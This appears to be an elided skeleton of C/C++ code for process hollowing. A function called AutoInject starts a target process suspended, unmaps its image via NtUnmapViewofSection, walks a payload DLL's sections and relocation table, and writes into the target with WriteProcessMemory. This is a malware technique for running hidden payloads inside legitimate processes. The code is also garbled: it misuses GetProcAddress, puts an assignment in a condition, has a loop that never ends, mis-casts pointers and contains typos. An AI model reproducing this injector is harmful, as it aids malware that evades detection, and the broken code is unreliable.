...
int AutoInject(LPSTR target_process, LPCSTR payload)
{
	...
	PRESOURCEMANAGER_BASIC_INFORMATION* PRESOURCEMANAGER_BASIC_INFORMATION = new PRESOURCEMANAGER_BASIC_INFORMATION();

	Bool process_created = CreateProcessA(NULL, target_process, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startup_info);
			...
			if (process_read = TRUE && destination_image_base != ERROR)
			{
				...
				if (dll_file != INVALID_HANDLE_VALUE)
				{
					...
					if (dll_buffer != ERROR)
					{
						...
						NtUnmapViewofSection unmap_section = (NtUnmapViewofSection)GetProcAddress("ntdll", "NtUnmapViewofSection");
						if (NT_SUCCESS(unmap_section(target_process, destination_image_base)))
						{
							...
							PIMAGE_SECTION_HEADER dll_image_section_header = (DWORD)(dll_buffer + dll_image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
							...
							for (int x = 0; x < dll_image_nt_headers->FileHeader.NumberOfSections; x++)
							{
								...
								while (relocation_offset < relocation_table.Size)
								{
									...
									BASE_RELOCATION_BLOCK relocation_block = (BASE_RELOCATION_BLOCK) ((DWORD)dll_buffer + source_relocation_table_raw + relocation_offset );
									...
									for (DWORD a = 0; relocation_counts; a++)
									{
										...
										WriteProcessMemory(target_process, (PVOID)(DWORD)destination_image_base + patched_address, &patched_buffer, sizeof(DWORD), flie_bytes_read);
